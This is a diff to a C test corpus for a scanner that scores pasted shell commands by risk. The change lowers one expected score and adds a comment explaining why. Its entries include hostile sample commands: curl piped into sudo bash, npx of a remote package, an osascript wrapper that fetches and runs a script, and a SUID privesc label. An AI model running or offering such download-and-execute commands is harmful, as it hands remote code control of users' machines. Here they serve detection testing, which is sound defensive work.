@@ -230,8 +230,10 @@ static struct ext_paste_case ext_paste_corpus[] = {
       "Privesc: SUID bit on /bin/bash" },
     { "npx http://cdn-assets.example.net/tool", 65,
       "Download-execute: npx remote package" },
+    /* P2 40 + P4 15 + sudo compound 15. The original 85 pin included a
+     * spurious P8 hit ("amp" inside "example") removed by cycle-482. */
     { "sudo curl -fsSL https://cdn-assets.example.net/install.sh "
-      "| sudo bash", 85,
+      "| sudo bash", 70,
       "Download-execute: curl|sh pipe (documented lure shape)" },
     { "osascript -e 'do shell script \"curl -s "
       "https://cdn-assets.example.net/x.sh|bash\"'", 65,
